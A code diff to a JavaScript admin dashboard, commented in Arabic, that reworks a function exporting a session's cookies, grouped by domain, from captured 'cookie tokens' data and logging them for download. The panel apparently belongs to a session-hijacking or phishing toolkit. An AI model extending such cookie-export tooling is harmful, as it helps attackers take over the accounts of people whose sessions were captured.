@@ -936,8 +936,11 @@ function populateSessionsTable(sessions) {
                 const sessionData = await fetchSessionDetails(id);
                 console.log('Session data for cookies:', sessionData);
                 
-                // استدعاء دالة تنزيل الكوكيز
-                downloadCookiesScript();
+                // التحقق من وجود tokens في بيانات الجلسة
+                const cookieTokens = sessionData.cookie_tokens || sessionData.CookieTokens || sessionData.tokens || sessionData.Tokens || {};
+                
+                // استدعاء دالة تنزيل الكوكيز مع بيانات الجلسة
+                downloadCookiesScript(sessionData);
             } catch (error) {
                 console.error('Error fetching session details:', error);
                 showToast('خطأ', 'فشل في تحميل تفاصيل الجلسة', 'error');
@@ -1277,7 +1280,7 @@ function setupEventListeners() {
 }
 
 // Add download cookies script
-function downloadCookiesScript() {
+function downloadCookiesScript(sessionData) {
     const downloadBtn = document.getElementById('download-cookies-btn');
     const sessionId = downloadBtn.dataset.sessionId;
     
@@ -1286,28 +1289,90 @@ function downloadCookiesScript() {
         return;
     }
     
-    // الحصول على الكوكيز من الجدول
-    const cookiesTable = document.getElementById('cookies-table');
-    const rows = cookiesTable.querySelectorAll('tbody tr');
+    // إنشاء صفيف للكوكيز
+    const cookies = [];
     
-    // التحقق من وجود كوكيز
-    if (rows.length === 0 || (rows.length === 1 && rows[0].cells.length === 1)) {
+    // التحقق من وجود بيانات الجلسة وتوكنز الكوكيز فيها
+    if (sessionData) {
+        // التحقق من مصادر محتملة مختلفة للكوكيز في بيانات الجلسة
+        const cookieTokens = sessionData.cookie_tokens || sessionData.CookieTokens || sessionData.tokens || sessionData.Tokens || {};
+        
+        // إذا وجدت توكنز كوكيز، قم بإضافتها
+        if (cookieTokens && Object.keys(cookieTokens).length > 0) {
+            for (const domain in cookieTokens) {
+                const domainCookies = cookieTokens[domain];
+                
+                for (const cookieName in domainCookies) {
+                    const cookie = domainCookies[cookieName];
+                    
+                    // التحقق من نوع البيانات وتنسيقها بشكل صحيح
+                    let cookieValue = '';
+                    if (typeof cookie === 'string') {
+                        cookieValue = cookie;
+                    } else if (cookie && typeof cookie === 'object') {
+                        cookieValue = cookie.value || cookie.Value || JSON.stringify(cookie);
+                    }
+                    
+                    cookies.push({
+                        domain: domain,
+                        name: cookieName,
+                        value: cookieValue
+                    });
+                }
+            }
+        }
+        
+        // إذا لم يتم العثور على أي كوكيز من البيانات، عرض رسالة
+        if (cookies.length === 0) {
+            showToast('تحذير', 'لم يتم العثور على كوكيز في بيانات الجلسة', 'warning');
+            
+            // قد نستخدم الطريقة القديمة للحصول على الكوكيز من الجدول
+            const cookiesTable = document.getElementById('cookies-table');
+            if (cookiesTable) {
+                const rows = cookiesTable.querySelectorAll('tbody tr');
+                
+                rows.forEach(row => {
+                    // تجاوز الصفوف التي تحتوي على رسائل (مثل "No cookies available")
+                    if (row.cells.length === 1) return;
+                    
+                    cookies.push({
+                        domain: row.cells[0].textContent,
+                        name: row.cells[1].textContent,
+                        value: row.cells[2].textContent
+                    });
+                });
+            }
+        }
+    } else {
+        // استخدام الطريقة القديمة للحصول على الكوكيز من الجدول إذا لم تتوفر بيانات الجلسة
+        const cookiesTable = document.getElementById('cookies-table');
+        if (cookiesTable) {
+            const rows = cookiesTable.querySelectorAll('tbody tr');
+            
+            // التحقق من وجود كوكيز
+            if (rows.length === 0 || (rows.length === 1 && rows[0].cells.length === 1)) {
+                showToast('خطأ', 'لا توجد كوكيز لهذه الجلسة', 'error');
+                return;
+            }
+            
+            rows.forEach(row => {
+                // تجاوز الصفوف التي تحتوي على رسائل (مثل "No cookies available")
+                if (row.cells.length === 1) return;
+                
+                cookies.push({
+                    domain: row.cells[0].textContent,
+                    name: row.cells[1].textContent,
+                    value: row.cells[2].textContent
+                });
+            });
+        }
+    }
+    
+    // التحقق النهائي من وجود كوكيز
+    if (cookies.length === 0) {
         showToast('خطأ', 'لا توجد كوكيز لهذه الجلسة', 'error');
         return;
     }
-    
-    // إنشاء صفيف للكوكيز
-    const cookies = [];
-    rows.forEach(row => {
-        // تجاوز الصفوف التي تحتوي على رسائل (مثل "No cookies available")
-        if (row.cells.length === 1) return;
-        
-        cookies.push({
-            domain: row.cells[0].textContent,
-            name: row.cells[1].textContent,
-            value: row.cells[2].textContent
-        });
-    });
     
     // ***** طباعة الكوكيز في سجلات المتصفح بشكل مفصل *****
     console.log('%c🍪 كوكيز الجلسة ' + sessionId, 'font-size:14px; font-weight:bold; color:#3498db;');
